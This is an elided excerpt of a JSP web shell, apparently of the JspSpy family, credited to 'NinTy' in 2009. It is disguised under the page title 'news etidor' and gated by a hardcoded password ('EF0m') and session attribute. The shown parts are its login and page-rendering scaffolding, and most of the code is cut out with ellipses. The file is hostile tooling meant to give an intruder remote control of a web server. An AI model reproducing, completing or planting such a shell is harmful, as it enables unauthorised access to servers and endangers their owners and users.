...
<%!
	private static final String PW = "EF0m"; 
	private static final String PW_SESSION_ATTRIBUTE = "jjj";
	...
	private static final String MODIFIED_ERROR = "Me Was Modified By Some Other Applications. Please Logout.";
	...
	private static class ScriptInvoker extends DefaultInvoker{
		...
		private static class BeforeInvoker extends  DefaultInvoker {
			public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
				try {
					PrintWriter out = response.getWriter();
					out.println("<html><head><title>news etidor</title><style type=\"text/css\">"+
		...
		private static class VLoginInvoker extends DefaultInvoker {
			...
			public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
				try {
					...
					"<!--<span style=\"font:11px Verdana;\">Copyright &copy; 2009 NinTy </span><a href=\"http://xxx\" target=\"_blank\">xx</a>--></p>"+
					"    </form><span style='font-weight:bold;color:red;font-size:12px'>ILoveU</span></body></html>");
				} catch (Exception e) {
